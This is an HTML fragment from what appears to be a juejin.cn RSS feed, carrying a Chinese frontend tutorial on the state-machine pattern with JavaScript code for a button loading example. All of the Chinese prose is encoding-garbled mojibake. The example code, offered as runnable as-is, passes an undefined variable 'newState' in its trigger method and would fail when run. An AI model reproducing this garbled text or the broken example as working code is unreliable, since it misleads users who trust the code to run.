<li>æ¢ç´¢ä¸ä¸šåŠ¡ç³»ç»Ÿæ·±åº¦é›†æˆï¼Œæ¨åŠ¨æµç¨‹è‡ªåŠ¨åŒ–</li>
</ol>
<hr/>
<p>AIä¸æ˜¯æ›¿ä»£äººåŠ›ï¼Œè€Œæ˜¯<strong>å¢å¼ºäººæ•ˆã€æ²‰æ·€çŸ¥è¯†ã€æ ‡å‡†åŒ–æœåŠ¡</strong>ã€‚å”®åæ™ºèƒ½åŠ©æ‰‹æ­£æ˜¯è¿™ä¸€ç†å¿µçš„è½åœ°å®è·µâ€”â€”è®©ä¸šåŠ¡æ”¯æŒæ›´æ™ºèƒ½ï¼Œè®©å›¢é˜Ÿåä½œæ›´è½»æ¾ã€‚</p>
<p>æœªæ¥ï¼Œæˆ‘ä»¬å°†ç»§ç»­æ¢ç´¢AIåœ¨ä¸šåŠ¡åœºæ™¯ä¸­çš„æ·±åº¦èåˆï¼Œè®©æ¯ä¸€ä¸ªæµç¨‹èŠ‚ç‚¹éƒ½æ‹¥æœ‰â€œæ™ºæ…§æ”¯æŒâ€ã€‚<strong>æ™ºèƒ½å”®åï¼Œåº”ç­”è€Œæ¥ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç®€å•è®°å½•ä¸‹ çŠ¶æ€æœº]]></title>    <link>https://juejin.cn/post/7603160727718051891</link>    <guid>https://juejin.cn/post/7603160727718051891</guid>    <pubDate>2026-02-05T09:53:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603160727718051891" data-draft-id="7603160727717920819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç®€å•è®°å½•ä¸‹ çŠ¶æ€æœº"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-02-05T09:53:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ccnocare"/> <meta itemprop="url" content="https://juejin.cn/user/1704658072243594"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç®€å•è®°å½•ä¸‹ çŠ¶æ€æœº
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1704658072243594/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ccnocare
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:53:16.000Z" title="Thu Feb 05 2026 09:53:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä»¥ä¸‹æ˜¯<strong>ç®€å•çš„çŠ¶æ€æœºè®¾è®¡æ¨¡å¼</strong>å’Œç®€å•ç¤ºä¾‹ï¼Œæ ¸å¿ƒæ˜¯å…ˆç†è§£çŠ¶æ€æœºçš„æ ¸å¿ƒæ€æƒ³ï¼Œå†é€šè¿‡æç®€ç¤ºä¾‹æŒæ¡ç”¨æ³•ï¼Œæœ€åæ‰©å±•åˆ°é€šç”¨è®¾è®¡æ¨¡å¼ã€‚</p>
<h3 data-id="heading-0">ä¸€ã€å…ˆææ‡‚ï¼šçŠ¶æ€æœºçš„æ ¸å¿ƒæ€æƒ³ï¼ˆäººè¯ç‰ˆï¼‰</h3>
<p>çŠ¶æ€æœºæœ¬è´¨æ˜¯ã€Œ<strong>æŠŠå¤æ‚çš„çŠ¶æ€åˆ‡æ¢è§„åˆ™å†™æ­»ï¼Œè®©ç¨‹åºåªèƒ½æŒ‰è§„åˆ™èµ°</strong>ã€ï¼Œå°±åƒï¼š</p>
<ul>
<li>ç©æ¸¸æˆæ—¶ï¼Œè§’è‰²ã€Œç«™ç«‹ã€åªèƒ½åˆ‡ã€Œè¡Œèµ°/è·³è·ƒã€ï¼Œä¸èƒ½ç›´æ¥åˆ‡ã€Œæ­»äº¡ã€ï¼›</li>
<li>ç‚¹å¤–å–æ—¶ï¼Œã€Œå¾…ä»˜æ¬¾ã€åªèƒ½åˆ‡ã€Œä»˜æ¬¾ä¸­/å–æ¶ˆã€ï¼Œä¸èƒ½ç›´æ¥åˆ‡ã€Œå·²æ”¶è´§ã€ã€‚
æ ¸å¿ƒä¸‰è¦ç´ ï¼ˆè®°ä½è¿™3ä¸ªï¼ŒçŠ¶æ€æœºå°±æ‡‚äº†ï¼‰ï¼š</li>
</ul>
<ol>
<li><strong>çŠ¶æ€ï¼ˆStateï¼‰</strong>ï¼š
ç¨‹åºå½“å‰çš„â€œèº«ä»½â€ï¼ˆæ¯”å¦‚ï¼šç©ºé—²ã€åŠ è½½ä¸­ã€æˆåŠŸã€å¤±è´¥ï¼‰ï¼›</li>
<li><strong>äº‹ä»¶ï¼ˆEventï¼‰</strong>ï¼šè§¦å‘çŠ¶æ€å˜åŒ–çš„â€œåŠ¨ä½œâ€ï¼ˆæ¯”å¦‚ï¼šç‚¹å‡»â€œåŠ è½½â€ã€è¯·æ±‚æˆåŠŸã€è¯·æ±‚å¤±è´¥ï¼‰ï¼›</li>
<li><strong>è§„åˆ™ï¼ˆTransitionï¼‰</strong>ï¼šâ€œä»€ä¹ˆçŠ¶æ€ä¸‹è§¦å‘ä»€ä¹ˆäº‹ä»¶ï¼Œèƒ½åˆ‡åˆ°ä»€ä¹ˆæ–°çŠ¶æ€â€ï¼ˆæ¯”å¦‚ï¼šç©ºé—²â†’ç‚¹å‡»åŠ è½½â†’åŠ è½½ä¸­ï¼‰ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-1">äºŒã€å‰ç«¯çŠ¶æ€æœºçš„é€šç”¨è®¾è®¡æ¨¡å¼ï¼ˆæç®€ç‰ˆï¼‰</h3>
<p>ä¸ç”¨ä¾èµ–ä»»ä½•åº“ï¼Œçº¯åŸç”ŸJSå°±èƒ½å®ç°ï¼Œæ ¸å¿ƒç»“æ„å°±4éƒ¨åˆ†ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// çŠ¶æ€æœºè®¾è®¡æ¨¡å¼æ¨¡æ¿ï¼ˆé€šç”¨ï¼‰ </span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">StateMachine</span> = { 
    <span class="hljs-comment">// 1. åˆå§‹çŠ¶æ€ </span>
    <span class="hljs-attr">currentState</span>: <span class="hljs-string">"åˆå§‹çŠ¶æ€"</span>, 
    <span class="hljs-comment">// 2. çŠ¶æ€åˆ‡æ¢è§„åˆ™ï¼š{ å½“å‰çŠ¶æ€: { äº‹ä»¶: ç›®æ ‡çŠ¶æ€ } } </span>
    <span class="hljs-attr">rules</span>: {}, 
    <span class="hljs-comment">// 3. è§¦å‘çŠ¶æ€åˆ‡æ¢çš„æ ¸å¿ƒæ–¹æ³•</span>
    <span class="hljs-title function_">trigger</span>(<span class="hljs-params">event, payload</span>) { 
        <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šæŸ¥è§„åˆ™ï¼Œåˆ¤æ–­å½“å‰çŠ¶æ€èƒ½ä¸èƒ½è§¦å‘è¿™ä¸ªäº‹ä»¶ </span>
        <span class="hljs-keyword">const</span> nextState = <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>]?.[event]; 
        <span class="hljs-keyword">if</span> (!nextState) { 
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`âŒ <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.currentState}</span>çŠ¶æ€ä¸‹ä¸èƒ½è§¦å‘<span class="hljs-subst">${event}</span>äº‹ä»¶`</span>); 
            <span class="hljs-keyword">return</span>; 
        } 
        <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šè®°å½•æ—§çŠ¶æ€ï¼Œåˆ‡æ¢åˆ°æ–°çŠ¶æ€ </span>
        <span class="hljs-keyword">const</span> oldState = <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>; 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span> = nextState; 
        <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šæ‰§è¡ŒçŠ¶æ€åˆ‡æ¢åçš„é€»è¾‘ï¼ˆæ¯”å¦‚æ›´æ–°UIã€è°ƒæ¥å£ï¼‰ </span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">onChange</span>(nextState, oldState, payload); 
    }, 
    <span class="hljs-comment">// 4. çŠ¶æ€å˜æ›´åçš„å›è°ƒï¼ˆè‡ªå®šä¹‰ä¸šåŠ¡é€»è¾‘ï¼‰ </span>
    <span class="hljs-title function_">onChange</span>(<span class="hljs-params">newState, oldState, payload</span>) { 
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`âœ… çŠ¶æ€å˜æ›´ï¼š<span class="hljs-subst">${oldState}</span> â†’ <span class="hljs-subst">${newState}</span>`</span>, payload); 
    }, 
};

</code></pre>
<hr/>
<h3 data-id="heading-2">ä¸‰ã€æœ€ç®€å•ç¤ºä¾‹ï¼š</h3>
<p>æŒ‰é’®ç‚¹å‡»çš„åŠ è½½çŠ¶æ€æœº ç”¨ã€ŒæŒ‰é’®ç‚¹å‡»è¯·æ±‚æ•°æ®ã€è¿™ä¸ªå‰ç«¯æœ€å¸¸è§çš„åœºæ™¯ï¼Œå®ç°çŠ¶æ€æœºï¼Œä¸€çœ‹å°±æ‡‚ï¼š</p>
<h4 data-id="heading-3">éœ€æ±‚</h4>
<p>æŒ‰é’®æœ‰4ä¸ªçŠ¶æ€ï¼š</p>
<ul>
<li>åˆå§‹ï¼š<code>idle</code>ï¼ˆç©ºé—²ï¼Œå¯ç‚¹å‡»ï¼‰ï¼›</li>
<li>ç‚¹å‡»åï¼š<code>loading</code>ï¼ˆåŠ è½½ä¸­ï¼Œç¦ç”¨æŒ‰é’®ï¼‰ï¼›</li>
<li>è¯·æ±‚æˆåŠŸï¼š<code>success</code>ï¼ˆæ˜¾ç¤ºæˆåŠŸï¼Œ3ç§’åé‡ç½®ä¸ºç©ºé—²ï¼‰ï¼›</li>
<li>è¯·æ±‚å¤±è´¥ï¼š<code>error</code>ï¼ˆæ˜¾ç¤ºå¤±è´¥ï¼Œå¯é‡æ–°ç‚¹å‡»ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-4">å®Œæ•´ä»£ç ï¼ˆå¯ç›´æ¥å¤åˆ¶è¿è¡Œï¼‰</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span> 
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span> 
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span> 
    <span class="hljs-comment">&lt;!-- UIï¼šä¸€ä¸ªæŒ‰é’® + çŠ¶æ€æç¤º --&gt;</span> 
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"btn"</span>&gt;</span>ç‚¹å‡»åŠ è½½æ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> 
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"status"</span>&gt;</span>å½“å‰çŠ¶æ€ï¼šç©ºé—²<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> 
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"> 
        <span class="hljs-comment">// 1. åˆå§‹åŒ–çŠ¶æ€æœº </span>
        <span class="hljs-keyword">const</span> loadDataFSM = { 
            <span class="hljs-comment">// åˆå§‹çŠ¶æ€ï¼šç©ºé—² </span>
            <span class="hljs-attr">currentState</span>: <span class="hljs-string">"idle"</span>, 
            <span class="hljs-comment">// 2. å®šä¹‰çŠ¶æ€åˆ‡æ¢è§„åˆ™ï¼ˆæ ¸å¿ƒï¼ï¼‰ </span>
            <span class="hljs-attr">rules</span>: { <span class="hljs-attr">idle</span>: { <span class="hljs-attr">click</span>: <span class="hljs-string">"loading"</span> },
            <span class="hljs-comment">// ç©ºé—²â†’ç‚¹å‡»â†’åŠ è½½ä¸­ </span>
            <span class="hljs-attr">loading</span>: { <span class="hljs-attr">success</span>: <span class="hljs-string">"success"</span>, <span class="hljs-attr">fail</span>: <span class="hljs-string">"error"</span> }, 
            <span class="hljs-comment">// åŠ è½½ä¸­â†’æˆåŠŸ/å¤±è´¥ </span>
            <span class="hljs-attr">success</span>: { <span class="hljs-attr">reset</span>: <span class="hljs-string">"idle"</span> }, 
            <span class="hljs-comment">// æˆåŠŸâ†’é‡ç½®â†’ç©ºé—² </span>
            <span class="hljs-attr">error</span>: { <span class="hljs-attr">retry</span>: <span class="hljs-string">"loading"</span> } 
            <span class="hljs-comment">// å¤±è´¥â†’é‡è¯•â†’åŠ è½½ä¸­ </span>
        }, 
        <span class="hljs-comment">// 3. è§¦å‘çŠ¶æ€åˆ‡æ¢çš„æ–¹æ³• </span>
        <span class="hljs-title function_">trigger</span>(<span class="hljs-params">event, payload</span>) { 
            <span class="hljs-keyword">const</span> nextState = <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>]?.[event]; 
            <span class="hljs-keyword">if</span> (!nextState) { 
                <span class="hljs-title function_">alert</span>(<span class="hljs-string">`å½“å‰<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.currentState}</span>çŠ¶æ€ï¼Œä¸èƒ½<span class="hljs-subst">${event}</span>ï¼`</span>); 
                <span class="hljs-keyword">return</span>; 
            } 
            <span class="hljs-keyword">const</span> oldState = <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>; 
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span> = nextState; 
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">onChange</span>(newState, oldState, payload); 
        }, 
        <span class="hljs-comment">// 4. çŠ¶æ€å˜æ›´åæ›´æ–°UIï¼ˆä¸šåŠ¡é€»è¾‘ï¼‰ </span>
        <span class="hljs-title function_">onChange</span>(<span class="hljs-params">newState, oldState, payload</span>) { 
            <span class="hljs-keyword">const</span> btn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"btn"</span>);
            <span class="hljs-keyword">const</span> status = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"status"</span>); 
            <span class="hljs-comment">// æ ¹æ®æ–°çŠ¶æ€æ›´æ–°UI </span>
            <span class="hljs-keyword">switch</span> (newState) { 
                <span class="hljs-keyword">case</span> <span class="hljs-string">"loading"</span>: 
                    btn.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>; 
                    btn.<span class="hljs-property">innerText</span> = <span class="hljs-string">"åŠ è½½ä¸­..."</span>; 
                    status.<span class="hljs-property">innerText</span> = <span class="hljs-string">"å½“å‰çŠ¶æ€ï¼šåŠ è½½ä¸­"</span>; 
                    <span class="hljs-comment">// æ¨¡æ‹Ÿå¼‚æ­¥è¯·æ±‚ </span>
                    <span class="hljs-title function_">mockRequest</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> { 
                        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">trigger</span>(<span class="hljs-string">"success"</span>);  <span class="hljs-comment">// è¯·æ±‚æˆåŠŸâ†’åˆ‡æ¢åˆ°success </span>
                    }).<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> { 
                        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">trigger</span>(<span class="hljs-string">"fail"</span>); <span class="hljs-comment">// è¯·æ±‚å¤±è´¥â†’åˆ‡æ¢åˆ°error </span>
                    }); 
                    <span class="hljs-keyword">break</span>; 
                <span class="hljs-keyword">case</span> <span class="hljs-string">"success"</span>: 
                    btn.<span class="hljs-property">disabled</span> = <span class="hljs-literal">false</span>; 
                    btn.<span class="hljs-property">innerText</span> = <span class="hljs-string">"ç‚¹å‡»åŠ è½½æ•°æ®"</span>; 
                    status.<span class="hljs-property">innerText</span> = <span class="hljs-string">"å½“å‰çŠ¶æ€ï¼šæˆåŠŸï¼ˆ3ç§’åé‡ç½®ï¼‰"</span>; <span class="hljs-comment">// 3ç§’åé‡ç½®ä¸ºç©ºé—²</span>
                    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">trigger</span>(<span class="hljs-string">"reset"</span>), <span class="hljs-number">3000</span>); 
                    <span class="hljs-keyword">break</span>; 
                <span class="hljs-keyword">case</span> <span class="hljs-string">"error"</span>: 
                    btn.<span class="hljs-property">disabled</span> = <span class="hljs-literal">false</span>; 
                    btn.<span class="hljs-property">innerText</span> = <span class="hljs-string">"é‡æ–°åŠ è½½"</span>; 
                    status.<span class="hljs-property">innerText</span> = <span class="hljs-string">"å½“å‰çŠ¶æ€ï¼šå¤±è´¥ï¼Œå¯é‡è¯•"</span>; 
                    <span class="hljs-keyword">break</span>; 
                <span class="hljs-keyword">case</span> <span class="hljs-string">"idle"</span>: 
                    btn.<span class="hljs-property">innerText</span> = <span class="hljs-string">"ç‚¹å‡»åŠ è½½æ•°æ®"</span>;
                    status.<span class="hljs-property">innerText</span> = <span class="hljs-string">"å½“å‰çŠ¶æ€ï¼šç©ºé—²"</span>; 
                    <span class="hljs-keyword">break</span>; 
                } 
            } 
        }; 
        <span class="hljs-comment">// æ¨¡æ‹Ÿå¼‚æ­¥è¯·æ±‚ï¼ˆ50%æˆåŠŸç‡ï¼‰ </span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">mockRequest</span>(<span class="hljs-params"/>) { 
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> { 
                <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> { 
                    <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &gt; <span class="hljs-number">0.5</span> ? <span class="hljs-title function_">resolve</span>() : <span class="hljs-title function_">reject</span>(); 
                }, <span class="hljs-number">1000</span>); 
        }); 
        } 
        <span class="hljs-comment">// ç»‘å®šæŒ‰é’®ç‚¹å‡»äº‹ä»¶ </span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"btn"</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"click"</span>, <span class="hljs-function">() =&gt;</span> { 
            <span class="hljs-comment">// ç‚¹å‡»æŒ‰é’®ï¼šè§¦å‘å¯¹åº”äº‹ä»¶ï¼ˆidleæ€è§¦å‘clickï¼Œerroræ€è§¦å‘retryï¼‰ </span>
            <span class="hljs-keyword">const</span> event = loadDataFSM.<span class="hljs-property">currentState</span> === <span class="hljs-string">"idle"</span> ? <span class="hljs-string">"click"</span> : <span class="hljs-string">"retry"</span>;
            loadDataFSM.<span class="hljs-title function_">trigger</span>(event); 
        }); 
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span> 
</code></pre>
<h4 data-id="heading-5">è¿è¡Œæ•ˆæœ</h4>
<ol>
<li>åˆå§‹ï¼šæŒ‰é’®å¯ç‚¹å‡»ï¼Œæ˜¾ç¤ºâ€œç‚¹å‡»åŠ è½½æ•°æ®â€ï¼ŒçŠ¶æ€æç¤ºâ€œç©ºé—²â€ï¼›</li>
<li>ç‚¹å‡»æŒ‰é’®ï¼šæŒ‰é’®ç¦ç”¨ï¼Œæ˜¾ç¤ºâ€œåŠ è½½ä¸­...â€ï¼Œ1ç§’åéšæœºåˆ‡æ¢ï¼š
<ul>
<li>æˆåŠŸï¼šæŒ‰é’®æ¢å¤ï¼Œæ˜¾ç¤ºâ€œç‚¹å‡»åŠ è½½æ•°æ®â€ï¼Œ3ç§’åé‡ç½®ä¸ºåˆå§‹æ€ï¼›</li>
<li>å¤±è´¥ï¼šæŒ‰é’®æ¢å¤ï¼Œæ˜¾ç¤ºâ€œé‡æ–°åŠ è½½â€ï¼Œç‚¹å‡»å¯é‡è¯•ï¼›</li>
</ul>
</li>
<li>éæ³•æ“ä½œæ‹¦æˆªï¼šæ¯”å¦‚â€œåŠ è½½ä¸­â€æ—¶é‡å¤ç‚¹å‡»æŒ‰é’®ï¼Œä¼šæç¤ºâ€œåŠ è½½ä¸­çŠ¶æ€ä¸‹ä¸èƒ½clickäº‹ä»¶â€ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-6">å››ã€æ ¸å¿ƒè®¾è®¡æ€è·¯æ‹†è§£ï¼ˆé€šä¿—æ˜“æ‡‚ï¼‰</h3>
<h4 data-id="heading-7">1. ä¸ºä»€ä¹ˆè¿™ä¹ˆè®¾è®¡ï¼Ÿ</h4>
<ul>
<li>æŠŠã€ŒçŠ¶æ€è§„åˆ™ã€å’Œã€Œä¸šåŠ¡é€»è¾‘ã€åˆ†å¼€ï¼šè§„åˆ™å†™åœ¨<code>rules</code>é‡Œï¼ŒUIé€»è¾‘å†™åœ¨<code>onChange</code>é‡Œï¼Œä¸ç”¨æ··åœ¨ä¸€èµ·ï¼›</li>
<li>æ‰€æœ‰çŠ¶æ€åˆ‡æ¢éƒ½èµ°<code>trigger</code>æ–¹æ³•ï¼Œç›¸å½“äºâ€œå”¯ä¸€å…¥å£â€ï¼Œé¿å…ç›´æ¥æ”¹<code>currentState</code>å¯¼è‡´çš„æ··ä¹±ï¼›</li>
<li>è§„åˆ™æ˜¯â€œæ˜¾æ€§çš„â€ï¼Œæ¯”å¦‚çœ‹<code>rules</code>å°±çŸ¥é“ï¼š</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript">    <span class="hljs-attr">rules</span>: { 
        <span class="hljs-attr">idle</span>: { <span class="hljs-attr">click</span>: <span class="hljs-string">"loading"</span> }, 
        <span class="hljs-attr">loading</span>: { <span class="hljs-attr">success</span>: <span class="hljs-string">"success"</span>, <span class="hljs-attr">fail</span>: <span class="hljs-string">"error"</span> }, 
        <span class="hljs-attr">success</span>: { <span class="hljs-attr">reset</span>: <span class="hljs-string">"idle"</span> }, 
        <span class="hljs-attr">error</span>: { <span class="hljs-attr">retry</span>: <span class="hljs-string">"loading"</span> }
    }
</code></pre>
<p>ä¸ç”¨é€è¡Œè¯»ä»£ç ï¼Œå°±èƒ½çŸ¥é“â€œä»€ä¹ˆçŠ¶æ€èƒ½åšä»€ä¹ˆäº‹â€ã€‚</p>
<h4 data-id="heading-8">2. å…³é”®ç»†èŠ‚ï¼ˆæ–°æ‰‹å¿…çœ‹ï¼‰</h4>
<ul>
<li><code>trigger</code>æ–¹æ³•æ˜¯â€œé—¨å«â€ï¼šå…ˆæŸ¥è§„åˆ™ï¼Œå†åˆ‡æ¢çŠ¶æ€ï¼Œæœ€åæ‰§è¡Œé€»è¾‘ï¼Œä¸€æ­¥éƒ½ä¸èƒ½å°‘ï¼›</li>
<li><code>onChange</code>æ–¹æ³•æ˜¯â€œæ‰§è¡Œè€…â€ï¼šåªè´Ÿè´£çŠ¶æ€å˜æ›´åçš„ä¸šåŠ¡ï¼ˆæ¯”å¦‚æ›´UIã€è°ƒæ¥å£ï¼‰ï¼Œä¸å…³å¿ƒæ€ä¹ˆåˆ‡æ¢çš„ï¼›</li>
